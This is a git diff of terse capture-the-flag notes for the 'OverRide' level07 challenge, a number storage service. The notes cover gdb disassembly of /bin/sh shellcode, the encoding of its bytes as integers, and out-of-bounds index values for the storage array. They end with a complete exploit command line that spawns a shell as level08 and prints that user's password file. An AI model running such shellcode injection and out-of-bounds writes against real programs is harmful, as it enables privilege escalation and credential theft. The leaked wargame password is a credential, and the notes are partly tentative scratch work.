@@ -109,6 +109,19 @@ f:  50                      push   eax
 13: b0 0b                   mov    al,0xb
 15: cd 80                   int    0x80
 
+(gdb) x/10i 0xffffd544
+   0xffffd544:	xor    eax,eax
+   0xffffd546:	push   eax
+   0xffffd547:	push   0x68732f2f
+   0xffffd54c:	push   0x6e69622f
+   0xffffd551:	mov    ebx,esp
+   0xffffd553:	push   eax
+   0xffffd554:	push   ebx
+   0xffffd555:	mov    ecx,esp
+   0xffffd557:	mov    al,0xb
+   0xffffd559:	int    0x80
+
+
 68 50 c0 31 = 1750122545
 # 31 c0 50 68 = 834687080
 python -c 'print "store"' ; python -c 'print "834687080"' ; python -c 'print "-2147483648"' #0
@@ -117,7 +130,7 @@ python -c 'print "store"' ; python -c 'print "834687080"' ; python -c 'print "-2
 # 2f 2f 73 68 = 791638888
 python -c 'print "store"' ; python -c 'print "791638888"' ; python -c 'print "1"' #1
 
-69 62 f2 68 = 1768092264
+69 62 2f 68 = 1768092264 1768042344
 # 68 2f 62 69 = 1747935849
 python -c 'print "store"' ; python -c 'print "1747935849"' ; python -c 'print "2"' #2
 
@@ -143,4 +156,37 @@ r < <(python -c 'print "store"' ; python -c 'print "1750122545"' ; python -c 'pr
 
 r < <(python -c 'print "store"' ; python -c 'print "1750122545"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "1752379183"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "1768092264"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "1357089134"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956404"' ; python -c 'print "-2147483658"')
 
-# DEPEND GDB ENV ???
+# GDB ENV ???
+
+134514927 <- MUST FIND
+
+08048930 <- real env GREATER
+080488ef <- gdb env
+
+0x41 ; 65 difference
+
+level07@OverRide:~$ (python -c 'print "read"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"') | ./level07
+(python -c 'print "read"' ; python -c 'print "-9"' ; python -c 'print "quit"') | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Index:  Number at data[4294967287] is 4294956388
+ Completed read command successfully
+
+➜  override git:(master) ✗ printf "%x\n" 4294956388
+-> ffffd564 this is the address of our shellcode
+
+(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803566"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956388"' ; python -c 'print "-2147483658"' ; cat) | ./level07
+
+Input command:  Number:  Index: whoami
+level08
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
